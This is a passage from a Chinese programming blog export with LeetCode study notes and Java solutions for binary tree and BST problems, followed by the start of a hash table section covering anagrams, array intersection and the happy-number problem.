<h3 id="思路：中序遍历-递归"><a href="#思路：中序遍历-递归" class="headerlink" title="思路：中序遍历+递归"></a>思路：中序遍历+递归</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    ArrayList&lt;Integer&gt; resList;</span><br><span class="line">    <span class="type">int</span> maxCount;</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">    TreeNode pre;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] findMode(TreeNode root) &#123;</span><br><span class="line">        resList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        maxCount = <span class="number">0</span>;</span><br><span class="line">        count = <span class="number">0</span>;</span><br><span class="line">        pre = <span class="literal">null</span>;</span><br><span class="line">        findMode1(root);</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[resList.size()];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; resList.size(); i++)&#123;</span><br><span class="line">            res[i] = resList.get(i);</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">findMode1</span><span class="params">(TreeNode root)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)    <span class="keyword">return</span> ;</span><br><span class="line">        findMode1(root.left);</span><br><span class="line">        <span class="type">int</span> <span class="variable">rootVal</span> <span class="operator">=</span> root.val;</span><br><span class="line">        <span class="keyword">if</span>(pre == <span class="literal">null</span> || rootVal != pre.val)&#123;</span><br><span class="line">            count = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(count &gt; maxCount )&#123;</span><br><span class="line">            resList.clear();</span><br><span class="line">            resList.add(rootVal);</span><br><span class="line">            maxCount = count;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(count == maxCount)&#123;</span><br><span class="line">            resList.add(root.val);</span><br><span class="line">        &#125;</span><br><span class="line">        pre = root;</span><br><span class="line"></span><br><span class="line">        findMode1(root.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="十五、二叉树的最近公共祖先"><a href="#十五、二叉树的最近公共祖先" class="headerlink" title="十五、二叉树的最近公共祖先"></a>十五、二叉树的最近公共祖先</h1><h2 id="236-二叉树的最近公共祖先"><a href="#236-二叉树的最近公共祖先" class="headerlink" title="236. 二叉树的最近公共祖先"></a><a href="https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-tree/">236. 二叉树的最近公共祖先</a></h2><blockquote>
<p>给定一个二叉树, 找到该树中两个指定节点的最近公共祖先。</p>
<p>百度百科中最近公共祖先的定义为：“对于有根树 T 的两个节点 p、q，最近公共祖先表示为一个节点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（一个节点也可以是它自己的祖先）。”</p>
<p><img src="https://assets.leetcode.com/uploads/2018/12/14/binarytree.png"></p>
<p>输入：root &#x3D; [3,5,1,6,2,0,8,null,null,7,4], p &#x3D; 5, q &#x3D; 1<br>输出：3<br>解释：节点 5 和节点 1 的最近公共祖先是节点 3 。</p>
</blockquote>
<h3 id="思路：回溯"><a href="#思路：回溯" class="headerlink" title="思路：回溯"></a>思路：回溯</h3><p>遇到这个题目首先想的是要是能自底向上查找就好了，这样就可以找到公共祖先了。</p>
<p>那么二叉树如何可以自底向上查找呢？</p>
<p>回溯啊，二叉树回溯的过程就是从低到上。</p>
<p>后序遍历就是天然的回溯过程，最先处理的一定是叶子节点。</p>
<p>接下来就看如何判断一个节点是节点q和节点p的公共公共祖先呢。</p>
<p><strong>首先最容易想到的一个情况：如果找到一个节点，发现左子树出现结点p，右子树出现节点q，或者 左子树出现结点q，右子树出现节点p，那么该节点就是节点p和q的最近公共祖先。</strong></p>
<p><strong>但是很多人容易忽略一个情况，就是节点本身p(q)，它拥有一个子孙节点q(p)。</strong></p>
<p>使用后序遍历，回溯的过程，就是从低向上遍历节点，一旦发现满足第一种情况的节点，就是最近公共节点了。</p>
<p><strong>但是如果p或者q本身就是最近公共祖先呢？其实只需要找到一个节点是p或者q的时候，直接返回当前节点，无需继续递归子树。如果接下来的遍历中找到了后继节点满足第一种情况则修改返回值为后继节点，否则，继续返回已找到的节点即可。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) &#123;</span><br><span class="line">        if(root == null || root == p || root == q)&#123;</span><br><span class="line">            return root;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        TreeNode left = lowestCommonAncestor(root.left,p,q);</span><br><span class="line">        TreeNode right = lowestCommonAncestor(root.right,p,q);</span><br><span class="line"></span><br><span class="line">        if(left == null &amp;&amp; right == null)&#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;else if(left == null &amp;&amp; right != null)&#123;</span><br><span class="line">            return right;</span><br><span class="line">        &#125;else if(left != null &amp;&amp; right == null)&#123;</span><br><span class="line">            return left;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return root;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="十六、二叉搜索树中的插入操作"><a href="#十六、二叉搜索树中的插入操作" class="headerlink" title="十六、二叉搜索树中的插入操作"></a>十六、二叉搜索树中的插入操作</h1><h2 id="701-二叉搜索树中的插入操作"><a href="#701-二叉搜索树中的插入操作" class="headerlink" title="701. 二叉搜索树中的插入操作"></a><a href="https://leetcode.cn/problems/insert-into-a-binary-search-tree/">701. 二叉搜索树中的插入操作</a></h2><p>给定二叉搜索树（BST）的根节点 root 和要插入树中的值 value ，将值插入二叉搜索树。 返回插入后二叉搜索树的根节点。 输入数据 保证 ，新值和原始二叉搜索树中的任意节点值都不同。</p>
<p>注意，可能存在多种有效的插入方式，只要树在插入后仍保持为二叉搜索树即可。 你可以返回 任意有效的结果 。</p>
<p><img src="https://assets.leetcode.com/uploads/2020/10/05/insertbst.jpg"></p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">insertIntoBST</span><span class="params">(TreeNode root, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(val);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(root.val &lt; val)&#123;</span><br><span class="line">            root.right = insertIntoBST(root.right,val);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(root.val &gt; val)&#123;</span><br><span class="line">            root.left = insertIntoBST(root.left,val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="十七、删除二叉搜索树中的节点"><a href="#十七、删除二叉搜索树中的节点" class="headerlink" title="十七、删除二叉搜索树中的节点"></a>十七、删除二叉搜索树中的节点</h1><h2 id="450-删除二叉搜索树中的节点"><a href="#450-删除二叉搜索树中的节点" class="headerlink" title="450. 删除二叉搜索树中的节点"></a><a href="https://leetcode.cn/problems/delete-node-in-a-bst/">450. 删除二叉搜索树中的节点</a></h2><p>给定一个二叉搜索树的根节点 root 和一个值 key，删除二叉搜索树中的 key 对应的节点，并保证二叉搜索树的性质不变。返回二叉搜索树（有可能被更新）的根节点的引用。</p>
<p>一般来说，删除节点可分为两个步骤：</p>
<p>首先找到需要删除的节点；<br>如果找到了，删除它。</p>
<blockquote>
<p>输入：root &#x3D; [5,3,6,2,4,null,7], key &#x3D; 3<br>输出：[5,4,6,2,null,null,7]<br>解释：给定需要删除的节点值是 3，所以我们首先找到 3 这个节点，然后删除它。<br>一个正确的答案是 [5,4,6,2,null,null,7], 如下图所示。<br>另一个正确答案是 [5,2,6,null,4,null,7]。</p>
</blockquote>
<p><img src="https://assets.leetcode.com/uploads/2020/09/04/del_node_1.jpg"></p>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>有以下五种情况：</p>
<ul>
<li>第一种情况：没找到删除的节点，遍历到空节点直接返回了</li>
<li>找到删除的节点<ul>
<li>第二种情况：左右孩子都为空（叶子节点），直接删除节点， 返回NULL为根节点</li>
<li>第三种情况：删除节点的左孩子为空，右孩子不为空，删除节点，右孩子补位，返回右孩子为根节点</li>
<li>第四种情况：删除节点的右孩子为空，左孩子不为空，删除节点，左孩子补位，返回左孩子为根节点</li>
<li>第五种情况：左右孩子节点都不为空，则将删除节点的左子树头结点（左孩子）放到删除节点的右子树的最左面节点的左孩子上，返回删除节点右孩子为新的根节点。</li>
</ul>
</li>
</ul>
<p>第五种情况有点难以理解，看下面动画：</p>
<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gnbj3k596mg30dq0aigyz.gif"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">deleteNode</span><span class="params">(TreeNode root, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">        root = delete(root,key);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">delete</span><span class="params">(TreeNode root, <span class="type">int</span> key)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(root.val &gt; key)&#123;</span><br><span class="line">            root.left = delete(root.left,key);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(root.val &lt; key)&#123;</span><br><span class="line">            root.right = delete(root.right,key);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(root.left == <span class="literal">null</span>) <span class="keyword">return</span> root.right;</span><br><span class="line">            <span class="keyword">if</span>(root.right == <span class="literal">null</span>) <span class="keyword">return</span> root.left;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">tmp</span> <span class="operator">=</span> root.right;</span><br><span class="line">            <span class="keyword">while</span>(tmp.left != <span class="literal">null</span>)&#123;</span><br><span class="line">                tmp = tmp.left;</span><br><span class="line">            &#125;</span><br><span class="line">            root.val = tmp.val;</span><br><span class="line">            root.right = delete(root.right,tmp.val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="十八、修剪二叉搜索树"><a href="#十八、修剪二叉搜索树" class="headerlink" title="十八、修剪二叉搜索树"></a>十八、修剪二叉搜索树</h1><h2 id="669-修剪二叉搜索树"><a href="#669-修剪二叉搜索树" class="headerlink" title="669. 修剪二叉搜索树"></a><a href="https://leetcode.cn/problems/trim-a-binary-search-tree/">669. 修剪二叉搜索树</a></h2><blockquote>
<p>给你二叉搜索树的根节点 root ，同时给定最小边界low 和最大边界 high。通过修剪二叉搜索树，使得所有节点的值在[low, high]中。修剪树 不应该 改变保留在树中的元素的相对结构 (即，如果没有被移除，原有的父代子代关系都应当保留)。 可以证明，存在 唯一的答案 。</p>
<p>所以结果应当返回修剪好的二叉搜索树的新的根节点。注意，根节点可能会根据给定的边界发生改变。</p>
<p><img src="https://assets.leetcode.com/uploads/2020/09/09/trim1.jpg"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [1,0,2], low = 1, high = 2</span><br><span class="line">输出：[1,null,2]</span><br></pre></td></tr></table></figure>

<p><img src="https://assets.leetcode.com/uploads/2020/09/09/trim2.jpg"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [3,0,4,null,2,null,null,1], low = 1, high = 3</span><br><span class="line">输出：[3,2,null,1]</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="思路递归"><a href="#思路递归" class="headerlink" title="思路	递归"></a>思路	递归</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">trimBST</span><span class="params">(TreeNode root, <span class="type">int</span> low, <span class="type">int</span> high)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.val &lt; low)&#123;</span><br><span class="line">            <span class="keyword">return</span> trimBST(root.right,low,high);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.val &gt; high)&#123;</span><br><span class="line">            <span class="keyword">return</span> trimBST(root.left,low,high);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//root在[low,high]范围内，继续</span></span><br><span class="line">        root.left = trimBST(root.left,low,high);</span><br><span class="line">        root.right = trimBST(root.right,low,high);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="十九、将有序数组转换为二叉搜索树"><a href="#十九、将有序数组转换为二叉搜索树" class="headerlink" title="十九、将有序数组转换为二叉搜索树"></a>十九、将有序数组转换为二叉搜索树</h1><h2 id="108-将有序数组转换为二叉搜索树"><a href="#108-将有序数组转换为二叉搜索树" class="headerlink" title="108. 将有序数组转换为二叉搜索树"></a><a href="https://leetcode.cn/problems/convert-sorted-array-to-binary-search-tree/">108. 将有序数组转换为二叉搜索树</a></h2><blockquote>
<p>给你一个整数数组 nums ，其中元素已经按 升序 排列，请你将其转换为一棵 高度平衡 二叉搜索树。</p>
<p>高度平衡 二叉树是一棵满足「每个节点的左右两个子树的高度差的绝对值不超过 1 」的二叉树。</p>
<p><img src="https://assets.leetcode.com/uploads/2021/02/18/btree1.jpg"></p>
<p>输入：nums &#x3D; [-10,-3,0,5,9]<br>输出：[0,-3,9,-10,null,5]<br>解释：[0,-10,5,null,-3,null,9] 也将被视为正确答案：</p>
<p><img src="https://assets.leetcode.com/uploads/2021/02/18/btree2.jpg"></p>
</blockquote>
<h3 id="思路：递归-11"><a href="#思路：递归-11" class="headerlink" title="思路：递归"></a>思路：递归</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">sortedArrayToBST</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> sorted(nums,<span class="number">0</span>,nums.length-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">sorted</span><span class="params">(<span class="type">int</span>[] nums , <span class="type">int</span> left, <span class="type">int</span> right)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(left &gt; right) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + ((right -left) &gt;&gt;<span class="number">1</span>);</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(nums[mid]);</span><br><span class="line">        root.left = sorted(nums,left,mid-<span class="number">1</span>);</span><br><span class="line">        root.right = sorted(nums,mid+<span class="number">1</span>,right);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="二十、把二叉搜索树转换为累加树"><a href="#二十、把二叉搜索树转换为累加树" class="headerlink" title="二十、把二叉搜索树转换为累加树"></a>二十、把二叉搜索树转换为累加树</h1><h2 id="538-把二叉搜索树转换为累加树"><a href="#538-把二叉搜索树转换为累加树" class="headerlink" title="538. 把二叉搜索树转换为累加树"></a><a href="https://leetcode.cn/problems/convert-bst-to-greater-tree/">538. 把二叉搜索树转换为累加树</a></h2><blockquote>
<p>给出二叉 搜索 树的根节点，该树的节点值各不相同，请你将其转换为累加树（Greater Sum Tree），使每个节点 node 的新值等于原树中大于或等于 node.val 的值之和。</p>
<p>提醒一下，二叉搜索树满足下列约束条件：</p>
<p>节点的左子树仅包含键 小于 节点键的节点。<br>节点的右子树仅包含键 大于 节点键的节点。<br>左右子树也必须是二叉搜索树。<br>注意：本题和 1038: <a href="https://leetcode-cn.com/problems/binary-search-tree-to-greater-sum-tree/">https://leetcode-cn.com/problems/binary-search-tree-to-greater-sum-tree/</a> 相同</p>
<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2019/05/03/tree.png"></p>
<p>输入：[4,1,6,0,2,5,7,null,null,null,3,null,null,null,8]<br>输出：[30,36,21,36,35,26,15,null,null,null,33,null,null,null,8]</p>
</blockquote>
<h3 id="思路：反中序遍历"><a href="#思路：反中序遍历" class="headerlink" title="思路：反中序遍历"></a>思路：反中序遍历</h3><p>利用二叉搜索树的性质：</p>
<p><strong>换一个角度来看，这就是一个有序数组[2, 5, 13]，求从后到前的累加数组，也就是[20, 18, 13]，是不是感觉这就简单了。</strong></p>
<p>那么知道如何遍历这个二叉树，也就迎刃而解了，<strong>从树中可以看出累加的顺序是右中左，所以我们需要反中序遍历这个二叉树，然后顺序累加就可以了</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    int sum;</span><br><span class="line">    public TreeNode convertBST(TreeNode root) &#123;</span><br><span class="line">        sum = 0;</span><br><span class="line">        convertBST1(root);</span><br><span class="line">        return root;</span><br><span class="line">    &#125;</span><br><span class="line">    public void convertBST1(TreeNode root)&#123;</span><br><span class="line">        if(root == null)&#123;</span><br><span class="line">            return ;</span><br><span class="line">        &#125;</span><br><span class="line">        convertBST1(root.right);</span><br><span class="line">        sum += root.val;</span><br><span class="line">        root.val = sum;</span><br><span class="line">        convertBST1(root.left);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>树</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode——链表</title>
    <url>/2022/05/03/17-leetcode%E2%80%94%E2%80%94%E5%93%88%E5%B8%8C%E8%A1%A8/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录一下leetcode哈希表部分题目的刷题笔记，顺序参考代码随想录中，但不仅限于这些，可以扩展记录。</p>
<p><a href="https://programmercarl.com/%E5%93%88%E5%B8%8C%E8%A1%A8%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80.html">代码随想录 ——哈希表理论基础</a></p>
<h1 id="242-有效的字母异位词"><a href="#242-有效的字母异位词" class="headerlink" title="242. 有效的字母异位词"></a><a href="https://leetcode-cn.com/problems/valid-anagram/">242. 有效的字母异位词</a></h1><blockquote>
<p>给定两个字符串 s 和 t ，编写一个函数来判断 t 是否是 s 的字母异位词。</p>
<p>注意：若 s 和 t 中每个字符出现的次数都相同，则称 s 和 t 互为字母异位词。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入: s = &quot;anagram&quot;, t = &quot;nagaram&quot;</span><br><span class="line">输出: true</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="思路：哈希表"><a href="#思路：哈希表" class="headerlink" title="思路：哈希表"></a>思路：哈希表</h2><p>思路很简单，维护一个26位数组，每次遍历s的时候，对应位置的值+1，遍历t的时候，对应字母位置值-1，当有一个小于0的时候，即数量不同，直接返回false</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isAnagram</span><span class="params">(String s, String t)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(s.length()!=t.length())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] table = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">26</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i&lt;s.length() ; i++)&#123;</span><br><span class="line">            table[s.charAt(i)-<span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; t.length(); i++)&#123;</span><br><span class="line">            table[t.charAt(i)-<span class="string">&#x27;a&#x27;</span>]--;</span><br><span class="line">            <span class="keyword">if</span>(table[t.charAt(i)-<span class="string">&#x27;a&#x27;</span>]&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h1 id="383-赎金信"><a href="#383-赎金信" class="headerlink" title="383. 赎金信"></a><a href="https://leetcode-cn.com/problems/ransom-note/">383. 赎金信</a></h1><blockquote>
<p>给你两个字符串：ransomNote 和 magazine ，判断 ransomNote 能不能由 magazine 里面的字符构成。</p>
<p>如果可以，返回 true ；否则返回 false 。</p>
<p>magazine 中的每个字符只能在 ransomNote 中使用一次。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：ransomNote = &quot;a&quot;, magazine = &quot;b&quot;</span><br><span class="line">输出：false</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="思路：哈希"><a href="#思路：哈希" class="headerlink" title="思路：哈希"></a>思路：哈希</h2><p>和上一题思路一样，代码也一样，唯一小改动是先添加magazine字符串，后在ransomNote中进行减操作。</p>
<h1 id="49-字母异位词分组"><a href="#49-字母异位词分组" class="headerlink" title="49. 字母异位词分组"></a><a href="https://leetcode-cn.com/problems/group-anagrams/">49. 字母异位词分组</a></h1><blockquote>
<p>给你一个字符串数组，请你将 字母异位词 组合在一起。可以按任意顺序返回结果列表。</p>
<p>字母异位词 是由重新排列源单词的字母得到的一个新单词，所有源单词中的字母通常恰好只用一次。</p>
<p>示例 1:</p>
<p>输入: strs &#x3D; [“eat”, “tea”, “tan”, “ate”, “nat”, “bat”]<br>输出: [[“bat”],[“nat”,”tan”],[“ate”,”eat”,”tea”]]</p>
</blockquote>
<h2 id="思路：哈希-排序"><a href="#思路：哈希-排序" class="headerlink" title="思路：哈希+排序"></a>思路：哈希+排序</h2><p>两个字符串互为字母异位词，当且仅当两个字符串包含的字母相同。同一组字母异位词中的字符串具备相同点，可以使用相同点作为一组字母异位词的标志，使用哈希表存储每一组字母异位词，哈希表的键为一组字母异位词的标志，哈希表的值为一组字母异位词列表。</p>
<p>遍历每个字符串，对于每个字符串，得到该字符串所在的一组字母异位词的标志，将当前字符串加入该组字母异位词的列表中。遍历全部字符串之后，哈希表中的每个键值对即为一组字母异位词。</p>
<p>由于互为字母异位词的两个字符串包含的字母相同，因此对两个字符串分别进行排序之后得到的字符串一定是相同的，故可以将排序之后的字符串作为哈希表的键</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;String&gt;&gt; <span class="title function_">groupAnagrams</span><span class="params">(String[] strs)</span> &#123;</span><br><span class="line">        Map&lt;String,List&lt;String&gt;&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String,List&lt;String&gt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(String str :strs)&#123;</span><br><span class="line">            <span class="type">char</span>[] arr = str.toCharArray();</span><br><span class="line">            Arrays.sort(arr);</span><br><span class="line">            <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(arr);</span><br><span class="line">            List&lt;String&gt; list = map.getOrDefault(key,<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;());</span><br><span class="line">            list.add(str);</span><br><span class="line">            map.put(key,list);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;List&lt;String&gt;&gt;(map.values());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行用时：5 ms, 在所有 Java 提交中击败了99.07%的用户</li>
<li>内存消耗：44 MB, 在所有 Java 提交中击败了86.11%的用户</li>
<li>通过测试用例：115 &#x2F; 115</li>
</ul>
<h1 id="349-两个数组的交集"><a href="#349-两个数组的交集" class="headerlink" title="349. 两个数组的交集"></a><a href="https://leetcode-cn.com/problems/intersection-of-two-arrays/">349. 两个数组的交集</a></h1><blockquote>
<p>给定两个数组 nums1 和 nums2 ，返回 它们的交集 。输出结果中的每个元素一定是 唯一 的。我们可以 不考虑输出结果的顺序 。</p>
<p>示例 1：</p>
<p>输入：nums1 &#x3D; [1,2,2,1], nums2 &#x3D; [2,2]<br>输出：[2]</p>
</blockquote>
<h2 id="思路：HashSet"><a href="#思路：HashSet" class="headerlink" title="思路：HashSet"></a>思路：HashSet</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] intersection(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2) &#123;</span><br><span class="line">        Set&lt;Integer&gt; set1 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        Set&lt;Integer&gt; set2 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums1)&#123;</span><br><span class="line">            set1.add(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums2)&#123;</span><br><span class="line">            <span class="keyword">if</span>(set1.contains(i))&#123;</span><br><span class="line">                set2.add(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span>[] ans = <span class="keyword">new</span> <span class="title class_">int</span>[set2.size()];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : set2)&#123;</span><br><span class="line">            ans[j++] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行用时：2 ms, 在所有 Java 提交中击败了95.92%的用户</li>
<li>内存消耗：41.6 MB, 在所有 Java 提交中击败了30.32%的用户</li>
<li>通过测试用例：55 &#x2F; 55</li>
</ul>
<h1 id="202-快乐数"><a href="#202-快乐数" class="headerlink" title="202. 快乐数"></a><a href="https://leetcode-cn.com/problems/happy-number/">202. 快乐数</a></h1><blockquote>
<p>编写一个算法来判断一个数 n 是不是快乐数。</p>
<p>「快乐数」 定义为：</p>
<p>对于一个正整数，每一次将该数替换为它每个位置上的数字的平方和。<br>然后重复这个过程直到这个数变为 1，也可能是 无限循环 但始终变不到 1。<br>如果这个过程 结果为 1，那么这个数就是快乐数。<br>如果 n 是 快乐数 就返回 true ；不是，则返回 false </p>
<p>示例 1：</p>
<p>输入：n &#x3D; 19<br>输出：true<br>解释：<br>12 + 92 &#x3D; 82<br>82 + 22 &#x3D; 68<br>62 + 82 &#x3D; 100<br>12 + 02 + 02 &#x3D; 1</p>
</blockquote>
<h2 id="思路：HashSet-1"><a href="#思路：HashSet-1" class="headerlink" title="思路：HashSet"></a>思路：HashSet</h2><p>题目中说了会 <strong>无限循环</strong>，那么也就是说<strong>求和的过程中，sum会重复出现，这对解题很重要！</strong></p>
<p>所以这道题目使用哈希法，来判断这个sum是否重复出现，如果重复了就是return false， 否则一直找到sum为1为止。</p>
